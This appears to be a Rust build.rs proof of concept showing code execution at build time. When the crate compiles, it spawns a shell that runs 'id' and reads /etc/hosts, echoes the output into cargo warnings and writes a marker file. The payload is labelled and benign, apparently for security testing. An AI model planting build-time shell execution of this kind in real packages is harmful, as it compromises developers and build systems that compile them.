use std::{fs, process::Command};

fn main() {
    // Safe diagnostics (no secrets, no network, non-destructive)
    let out = Command::new("sh")
        .arg("-lc")
        .arg(
            r#"
            printf '%s\n' '===RCE_POC_BUILD_RS_START===' \
                'Assurances: No secrets read; No network egress; No destructive ops.' \
                'Diagnostics:' '- id:'; id;
            printf '%s\n' '===/etc/hosts===';
            cat /etc/hosts;
            printf '%s\n' '===RCE_POC_BUILD_RS_END===';
        "#,
        )
        .output()
        .expect("failed to spawn shell");

    // Surface the output in build logs
    for line in String::from_utf8_lossy(&out.stdout).lines() {
        println!("cargo:warning={}", line);
    }
    for line in String::from_utf8_lossy(&out.stderr).lines() {
        println!("cargo:warning=STDERR: {}", line);
    }

    // Harmless marker file to prove write access
    let _ = fs::write(
        "SAFE_RCE_POC_BUILD_MARKER.txt",
        "hello from build.rs (safe)\n",
    );

    println!("cargo:warning=SAFE_RCE_POC: build.rs executed");
}
